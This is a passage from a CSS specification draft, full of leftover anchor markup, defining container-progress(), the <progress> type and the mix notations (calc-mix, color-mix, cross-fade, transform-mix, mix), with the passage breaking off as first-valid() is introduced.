The value of [media-progress()](#funcdef-media-progress) is a [\<number\>](https://www.w3.org/TR/css-values-4/#number-value), determined by [calculating a progress function](#calculate-a-progress-function).

<a id="ref-for-funcdef-media-progress⑤"></a>

<a id="ref-for-math-function④"></a>

<a id="ref-for-number-value⑧"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: [media-progress()](#funcdef-media-progress) is <em>not</em> a [math function](https://www.w3.org/TR/css-values-4/#math-function); it’s just a function that evaluates to a [\<number\>](https://www.w3.org/TR/css-values-4/#number-value).

<a id="ref-for-funcdef-container-progress①"></a>

### <a id="container-progress-func"></a>5.3.  Container Query Progress Values: the [container-progress()](#funcdef-container-progress) notation

<a id="ref-for-funcdef-media-progress⑥"></a>

<a id="ref-for-container-feature①"></a>

<a id="ref-for-media-feature④"></a>

The <a id="funcdef-container-progress"></a>container-progress() functional notation is identical to the [media-progress()](#funcdef-media-progress) functional notation, except that it accepts [container features](https://www.w3.org/TR/css-conditional-5/#container-feature) [\[CSS-CONTAIN-3\]](#biblio-css-contain-3) in place of [media features](https://www.w3.org/TR/mediaqueries-5/#media-feature).

<a id="ref-for-funcdef-container-progress②"></a>

The syntax of [container-progress()](#funcdef-container-progress) is defined as follows:

<a id="typedef-container-progress"></a>

<a id="ref-for-funcdef-container-progress③"></a>

<a id="ref-for-typedef-mf-name②"></a>

<a id="ref-for-typedef-container-name"></a>

<a id="ref-for-mult-opt①"></a>

<a id="ref-for-comb-comma④"></a>

<a id="ref-for-typedef-calc-sum⑦"></a>

<a id="ref-for-comb-comma⑤"></a>

<a id="ref-for-typedef-calc-sum⑧"></a>

```text
<container-progress()> = container-progress(<mf-name> [ of <container-name> ]?, <calc-sum>, <calc-sum>)
```
<a id="ref-for-typedef-mf-name③"></a>

<a id="ref-for-size-features"></a>

<a id="ref-for-typedef-container-name①"></a>

<a id="ref-for-progress-value⑦"></a>

<a id="ref-for-typedef-calc-sum⑨"></a>

<a id="ref-for-progress-start-value①①"></a>

<a id="ref-for-progress-end-value①⓪"></a>

where [\<mf-name\>](https://www.w3.org/TR/mediaqueries-5/#typedef-mf-name) represents a [size feature](https://www.w3.org/TR/css-conditional-5/#size-features) and the optional [\<container-name\>](https://www.w3.org/TR/css-conditional-5/#typedef-container-name) component specifies the named containers to consider when selecting a container to resolve them against. The value of the <a id="ref-for-size-features①"></a>size feature is the [progress value](#progress-value), and the two [\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum) values represent the [progress start value](#progress-start-value) and [progress end value](#progress-end-value), respectively.

<a id="ref-for-typedef-mf-name④"></a>

<a id="ref-for-size-features②"></a>

<a id="ref-for-progress-start-value①②"></a>

<a id="ref-for-progress-end-value①①"></a>

<a id="ref-for-calc-calculation⑤"></a>

<a id="ref-for-css-consistent-type③"></a>

<a id="ref-for-funcdef-container-progress④"></a>

<a id="ref-for-media-query④"></a>

The specified [\<mf-name\>](https://www.w3.org/TR/mediaqueries-5/#typedef-mf-name) must be a valid [size feature](https://www.w3.org/TR/css-conditional-5/#size-features), the specified [progress start value](#progress-start-value) and [progress end value](#progress-end-value) must be valid values for that <a id="ref-for-size-features③"></a>size feature, and both [calculation](https://www.w3.org/TR/css-values-4/#calc-calculation) values must have a [consistent type](https://www.w3.org/TR/css-values-4/#css-consistent-type), or else the function is invalid. [container-progress()](#funcdef-container-progress) is only valid in a property value context; it cannot be used in, for example, a [media query](https://www.w3.org/TR/mediaqueries-5/#media-query).

<a id="ref-for-progress-start-value①③"></a>

<a id="ref-for-progress-end-value①②"></a>

<a id="ref-for-calc-calculation⑥"></a>

<a id="ref-for-size-features④"></a>

<a id="ref-for-funcdef-container-progress⑤"></a>

<a id="ref-for-typedef-size-feature"></a>

<a id="ref-for-small-viewport-size"></a>

The [progress start value](#progress-start-value) and [progress end value](#progress-end-value) [calculations](https://www.w3.org/TR/css-values-4/#calc-calculation) are interpreted as specified for the [size feature](https://www.w3.org/TR/css-conditional-5/#size-features) (rather than as specified by the context the function is used in). If no appropriate containers are found, [container-progress()](#funcdef-container-progress) resolves its [\<size-feature\>](https://www.w3.org/TR/css-conditional-5/#typedef-size-feature) query against the [small viewport size](https://www.w3.org/TR/css-values-4/#small-viewport-size).

<a id="ref-for-funcdef-media-progress⑦"></a>

<a id="ref-for-number-value⑨"></a>

<a id="ref-for-calculate-a-progress-function③"></a>

The value of [media-progress()](#funcdef-media-progress) is a [\<number\>](https://www.w3.org/TR/css-values-4/#number-value), determined by [calculating a progress function](#calculate-a-progress-function).

<a id="ref-for-funcdef-container-progress⑥"></a>

<a id="ref-for-math-function⑤"></a>

<a id="ref-for-number-value①⓪"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: [container-progress()](#funcdef-container-progress) is <em>not</em> a [math function](https://www.w3.org/TR/css-values-4/#math-function); it’s just a function that evaluates to a [\<number\>](https://www.w3.org/TR/css-values-4/#number-value).

## <a id="mixing"></a>6.  Mixing and Interpolation Notations: the \*-mix() family

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-3bcda989"></a> This feature [does not handle multiple breakpoints very well](https://css.typetura.com/ruleset-interpolation/explainer/), and [might need to be redesigned](https://github.com/w3c/csswg-drafts/issues/6245#issuecomment-2469190377). [\[Issue \#6245\]](https://github.com/w3c/csswg-drafts/issues/6245)

<a id="ref-for-functional-notation③"></a>

Several <a id="mix-notations"></a>mix notations in CSS allow representing the interpolation of two values, the <a id="mix-start-value"></a>mix start value and the <a id="mix-end-value"></a>mix end value, at a given point in progress between them (the <a id="mix-progress-value"></a>mix progress value). These [functional notations](https://www.w3.org/TR/css-values-4/#functional-notation) follow the syntactic pattern:

<a id="ref-for-typedef-progress"></a>

<a id="ref-for-comb-comma⑥"></a>

<a id="ref-for-comb-one⑨⓪"></a>

<a id="ref-for-comb-comma⑦"></a>

<a id="ref-for-comb-one⑨①"></a>

```text
mix-function() = mix-function( <progress>, [=mix start value|start-value=], [=mix end value|end-value=] )
```
<a id="ref-for-mix-notations①"></a>

The [mix notations](#mix-notations) in CSS include:

- <a id="ref-for-funcdef-calc-mix"></a>

  <a id="ref-for-length-value④"></a>

  <a id="ref-for-percentage-value⑤"></a>

  <a id="ref-for-time-value"></a>

  <a id="ref-for-funcdef-calc①"></a>

  [calc-mix()](#funcdef-calc-mix), for interpolating [\<length\>](https://www.w3.org/TR/css-values-4/#length-value), [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value), [\<time\>](https://www.w3.org/TR/css-values-4/#time-value), and other dimensions representable in [calc()](https://www.w3.org/TR/css-values-4/#funcdef-calc) expressions

- <a id="ref-for-funcdef-color-mix"></a>

  <a id="ref-for-typedef-color①"></a>

  [color-mix()](https://www.w3.org/TR/css-color-5/#funcdef-color-mix), for interpolating two [\<color\>](https://www.w3.org/TR/css-color-5/#typedef-color) values

- <a id="ref-for-funcdef-cross-fade"></a>

  <a id="ref-for-typedef-image"></a>

  [cross-fade()](https://www.w3.org/TR/css-images-4/#funcdef-cross-fade), for interpolating [\<image\>](https://www.w3.org/TR/css-images-3/#typedef-image) values

- <a id="ref-for-funcdef-palette-mix"></a>

  <a id="ref-for-propdef-font-palette"></a>

  [palette-mix()](https://drafts.csswg.org/css-fonts-4/#funcdef-palette-mix), for interpolating two [font-palette](https://www.w3.org/TR/css-fonts-4/#propdef-font-palette) values

<a id="ref-for-funcdef-mix①"></a>

and finally the generic [mix()](#funcdef-mix) notation, which can represent the interpolation of any property’s values (but only the property’s entire value, not individual components).

<a id="ref-for-funcdef-cross-fade①"></a>

<a id="ref-for-typedef-progress①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [cross-fade()](https://www.w3.org/TR/css-images-4/#funcdef-cross-fade) notation also has an alternative syntax that allows for mixing more than two values, but does not allow for the more complex expressions of [\<progress\>](#typedef-progress).

<a id="ref-for-funcdef-mix②"></a>

<a id="ref-for-at-ruledef-keyframes"></a>

<a id="ref-for-component-value①"></a>

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-db9bc56c"></a> The [mix()](#funcdef-mix) notation also has a variant that takes a set of keyframes. It does this by referring to an [@keyframes](https://www.w3.org/TR/css-animations-1/#at-ruledef-keyframes) rule, and pulling the corresponding property declaration out of that. It would be nice to allow the other mix notations to take keyframe also, but how would we represent a set of keyframes for a [component value](https://www.w3.org/TR/css-syntax-3/#component-value) (rather than a full property value)?

<a id="ref-for-typedef-progress②"></a>

### <a id="progress-type"></a>6.1.  Representing Interpolation Progress: the [\<progress\>](#typedef-progress) type

<a id="ref-for-typedef-progress③"></a>

<a id="ref-for-mix-progress-value"></a>

<a id="ref-for-mix-notations②"></a>

<a id="ref-for-easing-function"></a>

The <a id="typedef-progress"></a>[\<progress\>](#typedef-progress) value type represents the [mix progress value](#mix-progress-value) in a [mix notation](#mix-notations), and ultimately resolves to a percentage. It can, however, draw that percentage value from sources such as media queries and animation timelines, and can also convert it through an [easing function](https://www.w3.org/TR/css-easing-2/#easing-function) before using it for interpolation.

Its syntax is defined as follows:

<a id="ref-for-typedef-progress④"></a>

<a id="ref-for-percentage-value⑥"></a>

<a id="ref-for-comb-one⑨②"></a>

<a id="ref-for-number-value①①"></a>

<a id="ref-for-comb-one⑨③"></a>

<a id="ref-for-propdef-animation-timeline"></a>

<a id="ref-for-comb-all④"></a>

<a id="ref-for-typedef-easing-function"></a>

<a id="ref-for-mult-opt②"></a>

```text
<progress> = [ <percentage> | <number> | <'animation-timeline'> ] && [ by <easing-function> ]?
```
where:

<a id="ref-for-typedef-percentage-token"></a>

<a id="valdef-progress-percentage-token"></a>[\<percentage-token\>](https://www.w3.org/TR/css-syntax-3/#typedef-percentage-token)

<a id="ref-for-number-value①②"></a>

Computes to the equivalent [\<number\>](https://www.w3.org/TR/css-values-4/#number-value): 0% becomes 0, 100% becomes 1, etc.

<a id="ref-for-length-value⑤"></a>

<a id="ref-for-propdef-width"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This only allows literal percentages, like 15%; calculations like calc(100% / 7) will not work, as they will instead attempt to use the normal rules for resolving a percentage against another type (such as [\<length\>](https://www.w3.org/TR/css-values-4/#length-value), in [width](https://www.w3.org/TR/css-sizing-3/#propdef-width)). Use expressions like calc(1 / 7) instead.

<a id="ref-for-number-value①③"></a>

<a id="valdef-progress-number"></a>[\<number\>](https://www.w3.org/TR/css-values-4/#number-value)

<a id="ref-for-mix-progress-value①"></a>

Represents the [mix progress value](#mix-progress-value).

<a id="ref-for-funcdef-progress⑧"></a>

<a id="ref-for-funcdef-media-progress⑧"></a>

<a id="ref-for-funcdef-container-progress⑦"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This allows the use of the [progress()](#funcdef-progress), [media-progress()](#funcdef-media-progress), and [container-progress()](#funcdef-container-progress) notations.

<a id="ref-for-propdef-animation-timeline①"></a>

<a id="valdef-progress-animation-timeline"></a>[\<'animation-timeline'\>](https://www.w3.org/TR/css-animations-2/#propdef-animation-timeline)

<a id="ref-for-valdef-animation-timeline-auto"></a>

<a id="ref-for-valdef-animation-timeline-none"></a>

<a id="ref-for-mix-progress-value②"></a>

Represents the [mix progress value](#mix-progress-value) as the progress of the specified [animation timeline](https://www.w3.org/TR/web-animations-1/#timelines). The values [none](https://www.w3.org/TR/css-animations-2/#valdef-animation-timeline-none) and [auto](https://www.w3.org/TR/css-animations-2/#valdef-animation-timeline-auto), however, are invalid. [\[CSS-ANIMATIONS-2\]](#biblio-css-animations-2) [\[WEB-ANIMATIONS-2\]](#biblio-web-animations-2)

<a id="ref-for-typedef-easing-function①"></a>

<a id="valdef-progress-easing-function"></a>[\<easing-function\>](https://www.w3.org/TR/css-easing-2/#typedef-easing-function)

<a id="ref-for-easing-function①"></a>

<a id="ref-for-mix-progress-value③"></a>

Converts the specified input [mix progress value](#mix-progress-value) into an output <a id="ref-for-mix-progress-value④"></a>mix progress value using the specified [easing function](https://www.w3.org/TR/css-easing-2/#easing-function). [\[CSS-EASING-1\]](#biblio-css-easing-1)

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Progress values below 0 and above 1 are valid; they allow representing interpolation beyond the range defined by the start and end values.

<a id="ref-for-typedef-progress⑤"></a>

<a id="ref-for-percentage-value⑦"></a>

<a id="ref-for-number-value①④"></a>

<a id="ref-for-funcdef-progress⑨"></a>

<a id="ref-for-propdef-width①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: While [\<progress\>](#typedef-progress) itself can be a [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value), mapping directly to the equivalent [\<number\>](https://www.w3.org/TR/css-values-4/#number-value), a function that <em>resolves</em> to a <a id="ref-for-number-value①⑤"></a>\<number\>, like [progress()](#funcdef-progress), resolves <a id="ref-for-percentage-value⑧"></a>\<percentage\>s using the normal rules for the context; for example, in [width](https://www.w3.org/TR/css-sizing-3/#propdef-width), they would be resolved against a length.

<a id="ref-for-computed-value③"></a>

<a id="ref-for-typedef-progress⑥"></a>

<a id="ref-for-percentage-value⑨"></a>

<a id="ref-for-number-value①⑥"></a>

<a id="ref-for-typedef-easing-function②"></a>

<a id="ref-for-propdef-animation-timeline②"></a>

The [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) of a [\<progress\>](#typedef-progress) value specified with [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value) or [\<number\>](https://www.w3.org/TR/css-values-4/#number-value) is the computed <a id="ref-for-number-value①⑦"></a>\<number\> converted through the [\<easing-function\>](https://www.w3.org/TR/css-easing-2/#typedef-easing-function) (if any). The <a id="ref-for-computed-value④"></a>computed value of a <a id="ref-for-typedef-progress⑦"></a>\<progress\> value specified with [\<'animation-timeline'\>](https://www.w3.org/TR/css-animations-2/#propdef-animation-timeline) is the computed <a id="ref-for-propdef-animation-timeline③"></a>\<'animation-timeline'\> and <a id="ref-for-typedef-easing-function③"></a>\<easing-function\> (if any).

<a id="ref-for-funcdef-calc-mix①"></a>

### <a id="calc-mix"></a>6.2.  Interpolated Numeric and Dimensional Values: the [calc-mix()](#funcdef-calc-mix) notation

<a id="ref-for-mix-notations③"></a>

<a id="ref-for-funcdef-calc②"></a>

<a id="ref-for-math-function⑥"></a>

The <a id="funcdef-calc-mix"></a>calc-mix() [mix notation](#mix-notations) represents an interpolated numeric or dimensional value. Like [calc()](https://www.w3.org/TR/css-values-4/#funcdef-calc), it is a [math function](https://www.w3.org/TR/css-values-4/#math-function), with the following syntactic form:

<a id="typedef-calc-mix"></a>

<a id="ref-for-funcdef-calc-mix②"></a>

<a id="ref-for-typedef-progress⑧"></a>

<a id="ref-for-comb-comma⑧"></a>

<a id="ref-for-typedef-calc-sum①⓪"></a>

<a id="ref-for-comb-comma⑨"></a>

<a id="ref-for-typedef-calc-sum①①"></a>

```text
<calc-mix()> = calc-mix( <progress>, <calc-sum>, <calc-sum> )
```
<a id="ref-for-typedef-calc-sum①②"></a>

<a id="ref-for-number-value①⑧"></a>

<a id="ref-for-typedef-dimension①"></a>

<a id="ref-for-percentage-value①⓪"></a>

<a id="ref-for-css-consistent-type④"></a>

<a id="ref-for-css-make-a-type-consistent②"></a>

<a id="ref-for-typedef-progress⑨"></a>

The [\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum) arguments can resolve to any [\<number\>](https://www.w3.org/TR/css-values-4/#number-value), [\<dimension\>](https://www.w3.org/TR/css-values-4/#typedef-dimension), or [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value), but must have a [consistent type](https://www.w3.org/TR/css-values-4/#css-consistent-type) or else the function is invalid. The result’s type will be the <a id="ref-for-css-consistent-type⑤"></a>consistent type, [made consistent](https://www.w3.org/TR/css-values-4/#css-make-a-type-consistent) with the type of the [\<progress\>](#typedef-progress) value.

<a id="ref-for-used-value"></a>

<a id="ref-for-funcdef-calc-mix③"></a>

<a id="ref-for-typedef-progress①⓪"></a>

<a id="ref-for-number-value①⑨"></a>

<a id="ref-for-computed-value⑤"></a>

The [used value](https://www.w3.org/TR/css-cascade-5/#used-value) of a valid [calc-mix()](#funcdef-calc-mix) is the result of interpolating these two values to the progress given by [\<progress\>](#typedef-progress). If the <a id="ref-for-typedef-progress①①"></a>\<progress\> value can be computed to a [\<number\>](https://www.w3.org/TR/css-values-4/#number-value), then the [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) is likewise the result of interpolating the two <a id="ref-for-computed-value⑥"></a>computed values to that <a id="ref-for-typedef-progress①②"></a>\<progress\> value (in other words, A \* (1-progress) + B \* progress) it is otherwise the <a id="ref-for-funcdef-calc-mix④"></a>calc-mix() notation itself with its arguments each computed according to their type.

<a id="ref-for-funcdef-color-mix①"></a>

### <a id="color-mix"></a>6.3.  Interpolated Color Values: the [color-mix()](https://www.w3.org/TR/css-color-5/#funcdef-color-mix) notation

<a id="ref-for-funcdef-color-mix②"></a>

<a id="ref-for-functional-notation④"></a>

<a id="ref-for-mix-notations④"></a>

This specification extends the [color-mix()](https://www.w3.org/TR/css-color-5/#funcdef-color-mix) [functional notation](https://www.w3.org/TR/css-values-4/#functional-notation) as a [mix notation](#mix-notations) accepting the following syntaxes:

<a id="ref-for-funcdef-color-mix③"></a>

<a id="ref-for-typedef-progress①③"></a>

<a id="ref-for-comb-all⑤"></a>

<a id="ref-for-color-interpolation-method"></a>

<a id="ref-for-mult-opt③"></a>

<a id="ref-for-comb-comma①⓪"></a>

<a id="ref-for-typedef-color②"></a>

<a id="ref-for-comb-comma①①"></a>

<a id="ref-for-typedef-color③"></a>

<a id="ref-for-comb-one⑨④"></a>

<a id="ref-for-color-interpolation-method①"></a>

<a id="ref-for-comb-comma①②"></a>

<a id="ref-for-typedef-color④"></a>

<a id="ref-for-comb-all⑥"></a>

<a id="ref-for-percentage-value①①"></a>

<a id="ref-for-mult-opt④"></a>

<a id="ref-for-mult-comma"></a>

```text
<color-mix()> =
  color-mix( [ <progress> && <color-interpolation-method>? ] , <color>, <color> ) |
  color-mix( <color-interpolation-method>, [<color> && <percentage [0,100]>?]#{2} )
```
<a id="ref-for-mix-notations⑤"></a>

<a id="ref-for-typedef-progress①④"></a>

<a id="ref-for-percentage-value①②"></a>

<a id="ref-for-typedef-color⑤"></a>

The used value of the first [mix notation](#mix-notations) variant is equivalent to assigning the [\<progress\>](#typedef-progress) value, as a [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value), to the <a id="ref-for-percentage-value①③"></a>\<percentage\> of the second [\<color\>](https://www.w3.org/TR/css-color-5/#typedef-color) argument in the second variant. <strong data-conversion-semantic="note">Note:</strong> That is, color-mix(progress, color1, color2) is equivalent to color-mix(color1, color2 progress). See [CSS Color 5 § 3 Mixing Colors: the color-mix() Function](https://www.w3.org/TR/css-color-5/#color-mix) for the normative definition of the second variant.

<a id="ref-for-typedef-progress①⑤"></a>

<a id="ref-for-funcdef-color-mix④"></a>

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-78ec385d"></a> [\<progress\>](#typedef-progress) allows returning percentages outside 0-100%, but [color-mix()](https://www.w3.org/TR/css-color-5/#funcdef-color-mix) doesn’t allows such values, so need to define how that gets processed.

<a id="ref-for-funcdef-cross-fade②"></a>

### <a id="cross-fade"></a>6.4.  Interpolated Image Values: the [cross-fade()](https://www.w3.org/TR/css-images-4/#funcdef-cross-fade) notation

<a id="ref-for-funcdef-cross-fade③"></a>

<a id="ref-for-functional-notation⑤"></a>

<a id="ref-for-mix-notations⑥"></a>

This specification extends the [cross-fade()](https://www.w3.org/TR/css-images-4/#funcdef-cross-fade) [functional notation](https://www.w3.org/TR/css-values-4/#functional-notation) as a [mix notation](#mix-notations) accepting the following syntaxes:

<a id="ref-for-funcdef-cross-fade④"></a>

<a id="ref-for-typedef-progress①⑥"></a>

<a id="ref-for-comb-comma①③"></a>

<a id="ref-for-typedef-image①"></a>

<a id="ref-for-comb-one⑨⑤"></a>

<a id="ref-for-typedef-color⑥"></a>

<a id="ref-for-comb-comma①④"></a>

<a id="ref-for-typedef-image②"></a>

<a id="ref-for-comb-one⑨⑥"></a>

<a id="ref-for-typedef-color⑦"></a>

<a id="ref-for-comb-one⑨⑦"></a>

<a id="ref-for-typedef-cf-image"></a>

<a id="ref-for-mult-comma①"></a>

```text
<cross-fade()> =
  cross-fade( <progress>, [ <image> | <color> ], [ <image> | <color> ] ) |
  cross-fade( <cf-image># )
```
<a id="ref-for-mix-notations⑦"></a>

<a id="ref-for-typedef-progress①⑦"></a>

<a id="ref-for-percentage-value①④"></a>

<a id="ref-for-typedef-color⑧"></a>

The used value of the first [mix notation](#mix-notations) variant is equivalent to assigning the [\<progress\>](#typedef-progress) value as the [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value) of the second [\<color\>](https://www.w3.org/TR/css-color-5/#typedef-color) argument in the second variant. <strong data-conversion-semantic="note">Note:</strong> That is, cross-fade(progress, image1, image2) is equivalent to cross-fade(image1, image2 progress). See [CSS Images 4 § 2.6 Combining images: the cross-fade() notation](https://www.w3.org/TR/css-images-4/#cross-fade-function) for the normative definition of the second variant.

<a id="ref-for-funcdef-transform-mix"></a>

### <a id="transform-mix"></a>6.5.  Interpolated Transform Values: the [transform-mix()](#funcdef-transform-mix) notation

<a id="ref-for-mix-notations⑧"></a>

<a id="ref-for-typedef-transform-list"></a>

The <a id="funcdef-transform-mix"></a>transform-mix() [mix notation](#mix-notations) represents an interpolated [\<transform-list\>](https://www.w3.org/TR/css-transforms-1/#typedef-transform-list), with the following syntactic form:

<a id="typedef-transform-mix"></a>

<a id="ref-for-funcdef-transform-mix①"></a>

<a id="ref-for-typedef-progress①⑧"></a>

<a id="ref-for-comb-comma①⑤"></a>

<a id="ref-for-typedef-transform-list①"></a>

<a id="ref-for-comb-comma①⑥"></a>

<a id="ref-for-typedef-transform-list②"></a>

```text
<transform-mix()> = transform-mix( <progress>, <transform-list>, <transform-list> )
```
<a id="ref-for-used-value①"></a>

<a id="ref-for-funcdef-transform-mix②"></a>

<a id="ref-for-typedef-progress①⑨"></a>

<a id="ref-for-percentage-value①⑤"></a>

<a id="ref-for-typedef-transform-list③"></a>

<a id="ref-for-computed-value⑦"></a>

The [used value](https://www.w3.org/TR/css-cascade-5/#used-value) of a valid [transform-mix()](#funcdef-transform-mix) is the result of interpolating these two values to the progress given by [\<progress\>](#typedef-progress). If the <a id="ref-for-typedef-progress②⓪"></a>\<progress\> value can be computed to a [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value), and the [\<transform-list\>](https://www.w3.org/TR/css-transforms-1/#typedef-transform-list)s can be interpolated without used-value-time information, then the [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) is likewise the result of interpolating the two <a id="ref-for-computed-value⑧"></a>computed values to that <a id="ref-for-typedef-progress②①"></a>\<progress\> value; it is otherwise the <a id="ref-for-funcdef-transform-mix③"></a>transform-mix() notation itself with its arguments each computed according to their type.

<a id="ref-for-funcdef-transform-mix④"></a>

<a id="ref-for-typedef-transform-function"></a>

[transform-mix()](#funcdef-transform-mix) is, itself, a [\<transform-function\>](https://www.w3.org/TR/css-transforms-2/#typedef-transform-function).

<a id="ref-for-funcdef-mix③"></a>

### <a id="mix"></a>6.6.  Interpolated Property Values: the [mix()](#funcdef-mix) notation

<a id="ref-for-interpolation①"></a>

<a id="ref-for-mix-notations⑨"></a>

[Interpolation](https://www.w3.org/TR/css-values-4/#interpolation) of any two property values can be represented by the <a id="funcdef-mix"></a>mix() [mix notation](#mix-notations), which supports two alternative syntax patterns:

<a id="typedef-mix"></a>

<a id="ref-for-funcdef-mix④"></a>

<a id="ref-for-typedef-progress②②"></a>

<a id="ref-for-comb-comma①⑦"></a>

<a id="ref-for-whole-value②"></a>

<a id="ref-for-comb-comma①⑧"></a>

<a id="ref-for-whole-value③"></a>

<a id="ref-for-comb-one⑨⑧"></a>

<a id="ref-for-typedef-progress②③"></a>

<a id="ref-for-comb-all⑦"></a>

<a id="ref-for-typedef-keyframes-name"></a>

```text
<mix()> =
  mix( <progress> , <whole-value> , <whole-value> ) |
  mix( <progress> && of <keyframes-name> )
```
<a id="ref-for-mix-notations①⓪"></a>

<a id="ref-for-whole-value④"></a>

<a id="ref-for-mix-start-value"></a>

<a id="ref-for-mix-end-value"></a>

<a id="ref-for-mix-progress-value⑤"></a>

The first syntax alternative, like other [mix notations](#mix-notations), interpolates between the first [\<whole-value\>](#whole-value) (its [mix start value](#mix-start-value)) and the second <a id="ref-for-whole-value⑤"></a>\<whole-value\> (its [mix end value](#mix-end-value)). The second uses the [mix progress value](#mix-progress-value) to interpolate the corresponding property declarations from a set of keyframes, allowing for more complex interpolation curves.

<a id="ref-for-mix-notations①①"></a>

<a id="ref-for-whole-value⑥"></a>

<a id="ref-for-funcdef-mix⑤"></a>

<a id="ref-for-interpolation②"></a>

<a id="ref-for-computed-value⑨"></a>

<a id="ref-for-typedef-progress②④"></a>

<a id="ref-for-functional-notation⑥"></a>

For the standard [mix notation](#mix-notations) variant, if the two [\<whole-value\>](#whole-value)s being interpolated by [mix()](#funcdef-mix) are [interpolable](https://www.w3.org/TR/css-values-4/#interpolation) as values for the property in which it is specified, and the interpolated value can be represented without <a id="ref-for-funcdef-mix⑥"></a>mix(), the [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) of <a id="ref-for-funcdef-mix⑦"></a>mix() is the result of interpolating these two values to the progress given by [\<progress\>](#typedef-progress). Otherwise, the <a id="ref-for-computed-value①⓪"></a>computed value of <a id="ref-for-funcdef-mix⑧"></a>mix() is the <a id="ref-for-funcdef-mix⑨"></a>mix() [functional notation](https://www.w3.org/TR/css-values-4/#functional-notation) itself with its <a id="ref-for-typedef-progress②⑤"></a>\<progress\> value computed and its <a id="ref-for-whole-value⑦"></a>\<whole-value\>s (if provided) computed as values for this property.

<a id="ref-for-funcdef-mix①⓪"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-d23568e3"></a> For example, most uses of [mix()](#funcdef-mix) will resolve at computed-value time:
>
> ```text
> color: mix(90%, red, blue);
> /* via simple interpolation,
>    computes to: */
> color: rgb(10% 0 90%);
> 
> color: mix(90%, currentcolor, black);
> /* can’t be fully resolved at computed-value time,
>    but still has a defined representation: */
> color: color-mix(currentcolor 90%, black 10%);
> 
> float: mix(90%, left, right);
> /* discretely animatable */
> float: right;
> ```
>
> But a few cases don’t have an intermediate representation:
>
> ```text
> transform: mix(90%, translate(calc(1em + 50%)), rotate(30deg));
> /* because functions don’t match, it will interpolate
>    via matrix(). But translate(%) needs layout
>    information to turn into a matrix(), so the
>    interpolated value can’t actually be represented.
>    Computes to: */
> transform: mix(90%, translate(calc(16px + 50%)), rotate(30deg));
> transform: mix(90% of ripple);
> ```
<a id="ref-for-funcdef-mix①①"></a>

<a id="ref-for-whole-value⑧"></a>

<a id="ref-for-not-animatable"></a>

The [mix()](#funcdef-mix) notation is a [\<whole-value\>](#whole-value). Additionally, if any of its <a id="ref-for-whole-value⑨"></a>\<whole-value\> arguments are [not animatable](https://www.w3.org/TR/web-animations-1/#not-animatable), the notation is invalid.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-3f7753cb"></a> For example, the following declarations are invalid, and will be ignored:
>
> ```text
> /* Invalid start value */
> color: mix(90%, #invalid, #F00);
> 
> /* Function is mixed with other values */
> background: url(ocean) mix(10%, blue, yellow);
> 
> /* 'animation-*' is not animatable */
> animation-delay: mix(0%, 0s, 2s);
> ```
## <a id="value-insert"></a>7.  Miscellaneous Value Substituting Functions

<a id="ref-for-whole-value①⓪"></a>

### <a id="whole-value"></a>7.1.  Representing An Entire Property Value: the [\<whole-value\>](#whole-value) type

<a id="ref-for-propdef-background-position⑤"></a>

<a id="ref-for-whole-value①①"></a>

Several functions defined in this specification can only be used as the "whole value" of a property. For example, [background-position: toggle(50px 50px, center);](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-position) is valid, but <a id="ref-for-propdef-background-position⑥"></a>background-position: toggle(50px, center) 50px; is not. The [\<whole-value\>](#whole-value) production represents these values.

<a id="ref-for-whole-value①②"></a>

<a id="ref-for-css-wide-keywords"></a>

All properties implicitly accept a [\<whole-value\>](#whole-value) as their entire value, just as they accept the [CSS-wide keywords](https://www.w3.org/TR/css-values-4/#css-wide-keywords) as their entire value.

<a id="ref-for-whole-value①③"></a>

When used as a component value of a function, [\<whole-value\>](#whole-value) also represents any CSS value normally valid as the whole value of the property in which it is used (including additional <a id="ref-for-whole-value①④"></a>\<whole-value\> functions). However, some functions may restrict what a <a id="ref-for-whole-value①⑤"></a>\<whole-value\> argument can include.

<a id="ref-for-funcdef-first-valid"></a>

### <a id="first-valid"></a>7.2.  Selecting the First Supported Value: the [first-valid()](#funcdef-first-valid) notation

<a id="ref-for-at-ruledef-supports①"></a>

CSS supports progressive enhancement with its forward-compatible parsing: authors can declare the same property multiple times in a style rule, using different values each time, and a CSS UA will automatically use the last one that it understands and throw out the rest. This principle, together with the [@supports](https://www.w3.org/TR/css-conditional-3/#at-ruledef-supports) rule, allows authors to write stylesheets that work well in old and new UAs simultaneously.

<a id="ref-for-funcdef-var③"></a>

However, using [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) (or similar substitution functions that resolve after parsing) thwarts this functionality; CSS UAs must assume any such property is valid at parse-time.

<a id="ref-for-functional-notation⑦"></a>

The <a id="funcdef-first-valid"></a>first-valid() [functional notation](https://www.w3.org/TR/css-values-4/#functional-notation) inlines the fallback behavior intrinsic to parsing declarations. Unlike most notations, it can accept any valid or invalid syntax in its arguments, and represents the first value among its arguments that is supported (parsed as valid) by the UA as the whole value of the property it’s used in.

<a id="typedef-first-valid"></a>

<a id="ref-for-typedef-declaration-value⑤"></a>

<a id="ref-for-mult-comma②"></a>

```text
